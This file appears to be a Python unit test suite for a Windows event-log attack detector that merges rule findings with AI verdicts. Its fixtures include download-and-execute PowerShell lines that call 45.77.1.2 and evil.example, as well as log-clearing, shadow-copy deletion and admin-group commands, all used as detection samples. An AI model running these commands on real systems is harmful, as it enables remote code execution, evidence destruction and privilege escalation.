"""
Test hồi quy bộ luật tương quan + hợp nhất kết quả (gộp từ bản update, chỉnh theo thiết kế luật mạnh/yếu).
Không gọi Ollama. Chạy: .venv\\Scripts\\python.exe -m unittest discover -s tests
"""
import sys
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "core"))

from analyze import (  # noqa: E402
    combine_batch_results,
    correlate_security_events,
    is_benign_noise,
    read_events,
    resolve_case_dir,
)
from evaluate import calculate_metrics, get_available_cases  # noqa: E402

BENCH = ROOT / "data_benchmark"


def ev(event_id, ref="E0001", time="2026-10-26T08:00:00.0000000Z", **data):
    return {"event_id": event_id, "event_ref": ref, "time": time, "data": data}


def findings_for(case_dir: Path) -> dict:
    events = read_events(case_dir)
    return correlate_security_events([e for e in events if not is_benign_noise(e)] or events)


class BenchmarkRegressionTests(unittest.TestCase):
    def setUp(self):
        if not BENCH.is_dir():
            self.skipTest("Chưa có data_benchmark/ (sinh bằng core/build_600_cases.py)")

    def test_no_strong_rule_on_benign_cases(self):
        """Luật MẠNH (luôn ALERT) không được bắn trên bất kỳ ca lành tính nào của benchmark."""
        fp = [(c["case_id"], f["strong_stages"]) for c in get_available_cases(BENCH)
              if c["ground_truth"] == "NORMAL" and (f := findings_for(c["dir"]))["strong_stages"]]
        self.assertEqual([], fp)

    def test_signature_attacks_detected(self):
        for name in ("case_b1_att_01_mimikatz_sekurlsa", "case_b1_att_02_procdump_lsass",
                     "case_b1_att_03_powershell_encoded_c2", "case_b1_att_05_clear_security_log",
                     "case_b1_att_08_vssadmin_delete_shadows", "case_b1_att_50_wevtutil_clear_system"):
            d = resolve_case_dir(name, BENCH)
            if d.is_dir():
                self.assertTrue(findings_for(d)["strong_stages"], f"{name} không được luật mạnh bắt")

    def test_typos_and_it_account_creation_are_not_strong(self):
        for name in ("case_b3_norm_001_typo_logon_once", "case_b3_norm_002_typo_admin_twice",
                     "case_b3_norm_004_it_create_new_employee"):
            d = resolve_case_dir(name, BENCH)
            if d.is_dir():
                f = findings_for(d)
                self.assertEqual([], f["strong_stages"], name)
                self.assertNotIn("Password Brute Force (MITRE T1110)", f["stages"], name)


class RuleUnitTests(unittest.TestCase):
    def test_brute_force_needs_time_window(self):
        # 3 lần sai qua mạng trong 20 giây -> brute force (mạnh)
        fast = [ev(4625, f"E000{i}", f"2026-10-26T08:00:{i * 10:02d}.0Z",
                   TargetUserName="admin", IpAddress="10.0.0.8", LogonType="3") for i in range(3)]
        self.assertIn("Password Brute Force (MITRE T1110)", correlate_security_events(fast)["strong_stages"])
        # 3 lần sai rải rác cách nhau 20 phút -> chỉ là tín hiệu yếu
        slow = [ev(4625, f"E000{i}", f"2026-10-26T08:{i * 20:02d}:00.0Z",
                   TargetUserName="admin", IpAddress="10.0.0.8", LogonType="3") for i in range(3)]
        f = correlate_security_events(slow)
        self.assertEqual([], f["strong_stages"])
        self.assertIn("Multiple Failed Logons (MITRE T1110)", f["stages"])

    def test_interactive_typos_below_threshold_are_not_brute_force(self):
        typos = [ev(4625, f"E000{i}", f"2026-10-26T08:00:0{i}.0Z", TargetUserName="nv01", LogonType="2")
                 for i in range(4)]
        self.assertNotIn("Password Brute Force (MITRE T1110)", correlate_security_events(typos)["stages"])

    def test_success_after_brute_force_must_match_identity(self):
        fails = [ev(4625, f"E000{i}", f"2026-10-26T08:00:0{i}.0Z",
                    TargetUserName="admin", IpAddress="10.0.0.8", LogonType="3") for i in range(3)]
        other = ev(4624, "E0010", "2026-10-26T08:00:30.0Z", TargetUserName="bob", IpAddress="10.0.0.9", LogonType="3")
        same = ev(4624, "E0011", "2026-10-26T08:00:40.0Z", TargetUserName="admin", IpAddress="10.0.0.8", LogonType="3")
        st = "Successful Logon Post-Brute Force (MITRE T1078)"
        self.assertNotIn(st, correlate_security_events(fails + [other])["stages"])
        self.assertIn(st, correlate_security_events(fails + [same])["strong_stages"])

    def test_native_admin_group_change_is_strong(self):
        for eid in (4732, 4756):
            f = correlate_security_events([ev(eid, TargetUserName="Administrators", MemberName="X\\u")])
            self.assertIn("Account Manipulation: Add to Privileged Group (MITRE T1098)", f["strong_stages"])

    def test_log_clear_event_and_command(self):
        st = "Indicator Removal: Clear Windows Event Logs (MITRE T1070.001)"
        self.assertIn(st, correlate_security_events([ev(1102)])["strong_stages"])
        self.assertIn(st, correlate_security_events([ev(4688, CommandLine="wevtutil.exe cl Security")])["strong_stages"])

    def test_internal_download_is_not_c2_but_external_is(self):
        st = "PowerShell / Command and Scripting Interpreter (MITRE T1059.001)"
        internal = ev(4104, ScriptBlockText="(New-Object Net.WebClient).DownloadString('http://intranet.corp.local/cfg.json')")
        external = ev(4104, ScriptBlockText="IEX (New-Object Net.WebClient).DownloadString('http://45.77.1.2/a.ps1')")
        # chuỗi phiên bản "10.0.19041" không được làm URL ngoài bị coi là nội bộ
        versioned = ev(4104, ScriptBlockText="# build 10.0.19041\nIEX (iwr http://evil.example/p.ps1)")
        self.assertNotIn(st, correlate_security_events([internal])["stages"])
        self.assertIn(st, correlate_security_events([external])["strong_stages"])
        self.assertIn(st, correlate_security_events([versioned])["strong_stages"])

    def test_it_account_creation_is_weak_but_admin_grant_is_strong(self):
        weak = correlate_security_events([ev(4688, CommandLine="net user nv_moi P@ss /add")])
        self.assertEqual([], weak["strong_stages"])
        self.assertIn("Account Creation Command (MITRE T1136)", weak["stages"])
        strong = correlate_security_events([ev(4688, CommandLine="net localgroup administrators svc_bk /add")])
        self.assertIn("Backdoor Creation / Privilege Escalation (MITRE T1136 / T1098)", strong["strong_stages"])

    def test_risk_score_is_bounded(self):
        f = correlate_security_events([ev(1102), ev(4688, "E0002", CommandLine="vssadmin delete shadows /all")])
        self.assertEqual(100, f["risk_score"])


class NoiseFilterEvasionTests(unittest.TestCase):
    """Bộ lọc nhiễu chạy trước luật và AI -> kẻ tấn công không được lợi dụng nó để giấu sự kiện."""

    def test_masqueraded_system_process_is_not_noise(self):
        # T1036: mã độc đặt tên giống tiến trình hệ thống nhưng nằm ngoài thư mục hệ thống
        for path in (r"C:\Users\Public\dllhost.exe", r"C:\Users\nv01\AppData\Local\Temp\svchost.exe"):
            self.assertFalse(is_benign_noise(ev(4688, NewProcessName=path, CommandLine="")), path)
        # bản thật trong System32 vẫn là nhiễu
        self.assertTrue(is_benign_noise(ev(4688, NewProcessName=r"C:\Windows\System32\dllhost.exe",
                                           CommandLine="dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}")))
        self.assertTrue(is_benign_noise(ev(4688, NewProcessName=r"C:\Windows\System32\svchost.exe", CommandLine="")))

    def test_noise_path_trust(self):
        noise = lambda path: is_benign_noise(ev(4688, NewProcessName=path, CommandLine=""))
        self.assertFalse(noise(r"C:\Windows\Temp\svchost.exe"))  # thư mục ghi được nằm trong C:\Windows
        self.assertTrue(noise(r"D:\Windows\System32\dllhost.exe"))  # Windows cài ở ổ khác
        self.assertTrue(noise(r"C:\Users\a\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe"))
        self.assertFalse(noise(r"C:\Users\a\AppData\Local\Microsoft\OneDrive\svchost.exe"))

    def test_set_strictmode_does_not_hide_malicious_script(self):
        evil = ev(4104, ScriptBlockText="Set-StrictMode -Off\nIEX (New-Object Net.WebClient).DownloadString('http://45.77.1.2/a.ps1')")
        self.assertFalse(is_benign_noise(evil))
        self.assertIn("PowerShell / Command and Scripting Interpreter (MITRE T1059.001)",
                      correlate_security_events([e for e in [evil] if not is_benign_noise(e)])["strong_stages"])
        # giả header CDXML nhưng có mã độc -> vẫn không phải nhiễu
        fake = ev(4104, ScriptBlockText="\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n"
                                        "# Microsoft.PowerShell.Cmdletization\nIEX (iwr http://evil.example/p.ps1)")
        self.assertFalse(is_benign_noise(fake))

    def test_autogenerated_cdxml_module_is_noise(self):
        cdxml = ev(4104, ScriptBlockText="\n#requires -version 3.0\n\ntry { Microsoft.PowerShell.Core\\Set-StrictMode -Off } catch { }\n\n"
                                         "Microsoft.PowerShell.Core\\Set-StrictMode -Version 3.0\n"
                                         "$__cmdletization_objectModelWrapper = Microsoft.PowerShell.Utility\\New-Object "
                                         "Microsoft.PowerShell.Cmdletization.Cim.CimCmdletAdapter")
        self.assertTrue(is_benign_noise(cdxml))


class CombineTests(unittest.TestCase):
    @staticmethod
    def batch(label, refs=(), stages=()):
        return {"verdict": {"label": label, "evidence_refs": list(refs), "detected_stages": list(stages),
                            "reason": "AI nhận định", "limitations": []}}

    def test_ai_alert_keeps_weak_rule_stages_and_refs(self):
        rule = {"stages": ["System Reconnaissance (MITRE T1033)"], "strong_stages": [],
                "evidence_refs": ["E0002"], "details": ["Recon. Bằng chứng: E0002."], "risk_score": 40}
        status, v = combine_batch_results([self.batch("ALERT", ["E0001"], ["Brute Force"])], 1, [], rule)
        self.assertEqual(("OK", "ALERT", "ai"), (status, v["label"], v["decision_source"]))
        self.assertEqual({"E0001", "E0002"}, set(v["evidence_refs"]))
        self.assertIn("System Reconnaissance (MITRE T1033)", v["detected_stages"])
        self.assertGreaterEqual(v["risk_score"], 70)

    def test_strong_rule_alerts_even_if_ai_says_normal(self):
        rule = {"stages": ["OS Credential Dumping (MITRE T1003)"], "strong_stages": ["OS Credential Dumping (MITRE T1003)"],
                "evidence_refs": ["E0003"], "details": ["x. Bằng chứng: E0003."], "risk_score": 100}
        _, v = combine_batch_results([self.batch("NORMAL")], 1, [], rule)
        self.assertEqual(("ALERT", "rule", "rule"), (v["label"], v["decision_source"], v["detection_source"]))

    def test_ai_normal_with_weak_rule_stays_normal(self):
        rule = {"stages": ["New Service Installed (MITRE T1543.003)"], "strong_stages": [],
                "evidence_refs": ["E0001"], "details": [], "risk_score": 30}
        _, v = combine_batch_results([self.batch("NORMAL")], 1, [], rule)
        self.assertEqual("NORMAL", v["label"])
        self.assertLess(v["risk_score"], 40)

    def test_unknown_with_weak_signals_becomes_review(self):
        rule = {"stages": ["System Reconnaissance (MITRE T1033)", "Create Account: Local Account (MITRE T1136.001)"],
                "strong_stages": [], "evidence_refs": ["E0001"], "details": [], "risk_score": 70}
        _, v = combine_batch_results([self.batch("UNKNOWN")], 1, [], rule)
        self.assertEqual("REVIEW", v["label"])
        _, v2 = combine_batch_results([self.batch("UNKNOWN")], 1, [],
                                      {"stages": [], "strong_stages": [], "evidence_refs": [], "details": [], "risk_score": 0})
        self.assertEqual("UNKNOWN", v2["label"])


class MetricsTests(unittest.TestCase):
    def test_review_is_not_counted_as_true_normal(self):
        m = calculate_metrics([
            {"ground_truth": "NORMAL", "pred_label": "REVIEW", "elapsed_seconds": 1, "json_valid": True},
            {"ground_truth": "NORMAL", "pred_label": "NORMAL", "elapsed_seconds": 1, "json_valid": True},
            {"ground_truth": "ALERT", "pred_label": "REVIEW", "elapsed_seconds": 1, "json_valid": True},
        ])
        self.assertEqual((1, 2, 1, 0), (m["tn"], m["review"], m["fn"], m["fp"]))


class SingleChannelCaseTest(unittest.TestCase):
    """Ca chỉ có 1 kênh log (vd chỉ powershell.xml) vẫn phải đọc được; thư mục rỗng thì báo lỗi rõ ràng."""

    PS_XML = (
        '<Events xmlns="http://schemas.microsoft.com/win/2004/08/events/event"><Event><System>'
        "<EventID>4104</EventID><TimeCreated SystemTime=\"2026-10-26T08:00:00.000Z\"/>"
        "<EventRecordID>1</EventRecordID><Channel>Microsoft-Windows-PowerShell/Operational</Channel>"
        "<Computer>PC</Computer></System><EventData>"
        '<Data Name="ScriptBlockText">whoami</Data></EventData></Event></Events>'
    )

    def test_powershell_only_case_is_readable(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            (Path(tmp) / "powershell.xml").write_text(self.PS_XML, encoding="utf-8")
            events = read_events(Path(tmp))
        self.assertEqual([4104], [e["event_id"] for e in events])

    def test_empty_case_dir_raises_clear_error(self):
        import tempfile
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaisesRegex(ValueError, "Missing file"):
                read_events(Path(tmp))


if __name__ == "__main__":
    unittest.main()
